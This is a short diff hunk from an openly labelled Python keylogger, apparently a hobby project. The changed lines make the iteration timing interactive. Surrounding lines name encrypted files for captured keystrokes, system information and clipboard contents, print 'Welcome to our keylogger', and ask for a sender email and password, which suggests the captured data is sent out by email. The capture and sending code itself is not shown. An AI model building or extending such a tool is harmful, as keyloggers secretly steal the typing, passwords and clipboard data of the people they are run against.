@@ -35,8 +35,8 @@ keys_information_e = "e_key_log.txt"
 system_information_e = "e_systeminfo.txt"
 clipboard_information_e = "e_clipboard.txt"
 # Iterations controls 
-time_iteration = 60
-number_of_iterations_end = 3
+time_iteration = int(input("Please enter the time needed for each iteration"))
+number_of_iterations_end = int(input("Please enter nuber of iterations needed"))
 print("Welcome to our keylogger ツ")
 # Sender email and password
 email_address = input("Please enter user email: ")# Enter disposable email here
